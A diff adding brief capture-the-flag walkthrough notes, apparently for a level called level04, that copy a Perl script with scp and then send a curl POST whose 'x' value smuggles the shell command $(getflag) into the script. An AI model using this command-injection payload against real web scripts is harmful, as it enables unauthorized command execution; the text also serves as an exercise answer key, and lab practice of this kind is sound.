@@ -1,0 +1,3 @@
+1.	retrieve file level04.pl:	scp -r -P <port> <remote@<ip>>:/<pathToFile> /<pathToLocal>
+2.	this time we need to send a http request in order to POST (send) 'x' value to the perl script
+3.	curl -X POST -d 'x="$(getflag)"' http://localhost:4747
